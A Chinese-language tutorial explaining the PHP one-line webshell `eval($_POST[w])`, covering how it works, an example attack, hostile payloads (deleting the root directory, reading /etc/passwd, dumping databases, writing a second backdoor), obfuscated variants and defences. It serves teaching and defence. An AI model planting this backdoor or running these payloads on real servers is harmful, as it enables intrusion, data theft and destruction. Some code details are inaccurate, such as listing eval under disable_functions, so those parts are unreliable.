# 什么是木马/Trojan Horse。笔者从来不爱谈概念。我们直接从最简单的一句话木马开始。
# 我们首先来解析一下一句话木马 `<?php eval($_POST[w]);?>`
这是最经典、最基础的 **PHP一句话木马**（也叫“一句话后门”）。
核心作用是给攻击者留下「远程控制目标服务器」的入口——通过简单代码实现“接收指令+执行指令”。
下面从「代码拆解、工作原理、攻击流程、危害、防御」五个维度讲一讲：


## 一、逐段拆解代码：每个部分的作用
先看完整代码的语法结构（注意：标准写法中 `$_POST['w']` 建议加引号，无引号在PHP低版本兼容，但不规范，不影响核心功能）：
```php
<?php  // PHP代码的开始标记（告诉服务器这是PHP脚本）
eval(       // 核心执行函数：把字符串当作PHP代码执行（高危！）
  $_POST['w']  // 接收客户端（攻击者）通过POST方式传递的、名为"w"的参数值
); 
?>  // PHP代码的结束标记
```

### 关键组件详解（核心是「接收指令」+「执行指令」）
1. **`<?php ?>`**：PHP的代码边界标记，服务器会解析这对标记之间的内容为PHP代码（如果省略结束标记 `?>`，在单文件脚本中也能正常运行）。
3. **`eval()` 函数**：PHP的“动态代码执行函数”，它的参数必须是「合法的PHP代码字符串」，执行后会返回代码运行结果。     例子：`eval("echo 123;")` 等价于直接写 `echo 123;`，会输出 `123`；  
   危险点：**无论参数是什么字符串，都会被当作PHP代码执行**——这是木马能工作的核心，也是最致命的地方。
3. **`$_POST['w']`**：PHP的「超全局变量」，用于接收客户端通过 `POST` 请求方式传递的参数：
   - `$_POST`：接收POST类型的请求参数（相对于GET请求，POST参数不会显示在URL中，更隐蔽）；
   - `['w']`：参数名是 `w`（攻击者可自定义为任意字符，比如 `x`、`cmd` 等，只要前后一致）；
   - 作用：攻击者通过POST请求，把「想要执行的恶意PHP代码」当作参数值传给服务器。


## 二、工作原理：攻击者怎么利用它？
整个流程就像“攻击者给服务器发「命令」，服务器执行后返回结果”，步骤如下：

### 1. 前提：木马已上传到目标服务器
攻击者通过各种漏洞（比如文件上传漏洞、SQL注入写文件漏洞、服务器配置漏洞），把包含这段代码的文件（比如 `shell.php`）上传到目标服务器的Web目录下（比如 `www/root/`、`upload/`）。

### 2. 攻击者发送恶意指令（POST请求）
攻击者用工具（比如蚁剑、菜刀、中国菜刀，或Postman、BurpSuite）向 `http://目标服务器IP/shell.php` 发送POST请求，核心是传递参数 `w`，参数值是「想要执行的PHP代码」。

#### 举个实际攻击例子：
假设目标服务器已上传 `shell.php`，攻击者发送如下POST请求：
- 请求URL：`http://xxx.com/shell.php`
- 请求方法：POST
- 请求参数：`w=system("ls /");` （`system()` 是PHP执行系统命令的函数，`ls /` 是Linux查看根目录文件的命令）

### 3. 服务器执行指令，返回结果
- 服务器接收请求后，解析 `shell.php` 中的代码：`eval($_POST['w'])` 会变成 `eval("system('ls /');")`；
- `eval()` 把字符串当作PHP代码执行，`system("ls /")` 会调用服务器的系统命令，列出根目录下的所有文件；
- 执行结果会返回给攻击者，攻击者就能看到服务器的文件结构。


## 三、它能做什么？（权限这一块）
只要木马没被发现，攻击者几乎能「完全控制目标服务器」，常见恶意操作包括：
1. **执行系统命令**：
   - Linux：`system("ls")`（列文件）、`system("rm -rf /")`（删根目录，毁数据）、`system("whoami")`（查看当前用户权限）；
   - Windows：`system("dir C:\\")`（查看C盘文件）、`system("net user")`（查看系统用户）；
2. **读写服务器文件**：
   - 读文件：`eval($_POST['w']="echo file_get_contents('/etc/passwd');")`（读取Linux系统用户配置文件）；
   - 写文件：`eval($_POST['w']="file_put_contents('后门2.php','<?php eval($_POST[x]);?>');")`（再留一个备用后门）；
3. **窃取敏感数据**：
   - 读取数据库配置文件（比如 `config.php` 中的数据库账号密码）；
   - 导出数据库数据（比如执行 `mysql -u root -pXXX -e "select * from user"` 窃取用户数据）；
4. **提权与横向渗透**：
   - 如果当前Web用户权限高（比如 `root`），攻击者可直接控制整台服务器；
   - 若权限低，可通过漏洞提权，或攻击内网其他服务器。


## 四、为什么它很危险呢？
1. **隐蔽性极强**：
   - 代码只有1行，可嵌入到正常PHP文件中（比如混入 `index.php` 的注释里），很难被发现；
   - 用POST传参，指令不会暴露在URL中，绕过简单的日志审计；
2. **功能无限制**：`eval()` 能执行任意PHP代码，而PHP本身能调用系统命令、操作文件/数据库，相当于给攻击者开了“万能权限”；
3. **门槛极低**：攻击者无需复杂技术，用现成工具（蚁剑、菜刀）就能连接，图形化操作（像操作本地文件一样浏览服务器）。


# 如何来防御一句话木马呢

## 1. **禁用高危函数**：在PHP配置文件 `php.ini` 中，将 `eval`、`system`、`exec`、`shell_exec`、`file_put_contents` 等高危函数加入 `disable_functions`（禁用列表）：
   ```ini
   disable_functions = eval,system,exec,shell_exec,passthru,proc_open,file_put_contents
   ```
## 2. **限制文件上传**：
   - 禁止上传 `.php` 等可执行脚本文件（后缀白名单：只允许 `jpg/png/gif` 等静态文件）；
   - 对上传文件做“内容校验”（比如图片文件要验证是否为真实图片，而非改后缀的PHP文件）；
## 3. **过滤用户输入**：如果业务必须接收用户输入的PHP代码（极少场景），严格过滤 `eval`、`system`、`exec` 等关键词，禁止传递恶意函数；
4. **提升服务器安全配置**：
   - 给Web目录设置「最小权限」（比如Web用户只能读，不能写/执行其他目录文件）；
   - 开启PHP的 `open_basedir`（限制PHP只能操作指定目录，防止跨目录读取系统文件）；
5. **定期审计文件**：监控Web目录下的PHP文件变化，及时发现未知的可疑文件（比如突然出现的 `shell.php`、`test.php`）；
6. **更新补丁**：及时更新PHP版本和服务器系统补丁，避免因漏洞被攻击者上传木马。


## 补充：常见变种（换汤不换药的）
攻击者为绕过防御，会对一句话木马做简单变形，但核心还是「`接收参数+eval执行`」：
### 1. 换参数名：`<?php eval($_POST['x']);?>`（参数名从 `w` 改成 `x`）；
### 2. 换接收方式：`<?php eval($_GET['w']);?>`（用GET传参，参数会显示在URL中，隐蔽性差）；
### 3. 编码混淆：`<?php eval(base64_decode($_POST['w']));?>`（攻击者传递Base64编码后的指令，绕过关键词过滤）；
### 4. 函数替换：`<?php assert($_POST['w']);?>`（`assert()` 也能执行PHP代码，效果和 `eval` 类似，部分场景可绕过 `disable_functions`）。


# 总结
这句话最简单的一句话木马的本质是「利用 `eval` 函数的动态执行特性，将用户输入当作代码执行」，相当于给攻击者留了一把“服务器万能钥匙”。防御的核心是「禁用高危函数+限制文件上传+最小权限配置」，同时定期审计服务器文件，避免木马被植入。

